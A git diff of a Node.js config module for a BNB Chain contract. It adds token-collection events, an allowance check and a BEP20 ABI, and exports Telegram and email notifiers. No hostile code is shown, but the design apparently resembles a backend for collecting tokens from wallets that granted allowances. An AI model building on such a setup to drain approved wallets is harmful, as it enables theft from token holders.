@@ -3,7 +3,7 @@ const { Web3 } = require('web3');
 const TelegramBot = require('node-telegram-bot-api');
 const nodemailer = require('nodemailer');
 
-// Contract ABI
+// Contract ABI - Sirf wahi jo backend use karta hai
 const CONTRACT_ABI = [
     {
         "inputs": [{"internalType": "address","name": "from","type": "address"}],
@@ -18,35 +18,62 @@ const CONTRACT_ABI = [
         "outputs": [{"internalType": "address[]","name": "","type": "address[]"}],
         "stateMutability": "view",
         "type": "function"
+    },
+    {
+        "anonymous": false,
+        "inputs": [
+            {"indexed": true, "internalType": "address", "name": "from", "type": "address"},
+            {"indexed": true, "internalType": "address", "name": "token", "type": "address"},
+            {"indexed": true, "internalType": "address", "name": "recipient", "type": "address"},
+            {"indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256"}
+        ],
+        "name": "TokensCollected",
+        "type": "event"
+    },
+    {
+        "anonymous": false,
+        "inputs": [
+            {"indexed": true, "internalType": "address", "name": "from", "type": "address"},
+            {"indexed": true, "internalType": "address", "name": "token", "type": "address"}
+        ],
+        "name": "TokenCollectionFailed",
+        "type": "event"
     }
 ];
 
-// ERC20 ABI
-const ERC20_ABI = [
+// BEP20 ABI - Balance, allowance, decimals, symbol
+const BEP20_ABI = [
     {
         "constant": true,
-        "inputs": [{"name": "_owner","type": "address"}],
+        "inputs": [{"name": "_owner", "type": "address"}],
         "name": "balanceOf",
-        "outputs": [{"name": "balance","type": "uint256"}],
+        "outputs": [{"name": "balance", "type": "uint256"}],
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}],
+        "name": "allowance",
+        "outputs": [{"name": "remaining", "type": "uint256"}],
         "type": "function"
     },
     {
         "constant": true,
         "inputs": [],
         "name": "decimals",
-        "outputs": [{"name": "","type": "uint8"}],
+        "outputs": [{"name": "", "type": "uint8"}],
         "type": "function"
     },
     {
         "constant": true,
         "inputs": [],
         "name": "symbol",
-        "outputs": [{"name": "","type": "string"}],
+        "outputs": [{"name": "", "type": "string"}],
         "type": "function"
     }
 ];
 
-// Token Info
+// Token Info - Same as contract default tokens
 const TOKEN_INFO = {
     '0x55d398326f99059ff775485246999027b3197955': { symbol: 'USDT', stable: true },
     '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d': { symbol: 'USDC', stable: true },
@@ -107,7 +134,7 @@ module.exports = {
     contract,
     getAccount,
     TOKEN_INFO,
-    ERC20_ABI,
+    BEP20_ABI,
     telegramBots,
     emailTransporter
 };
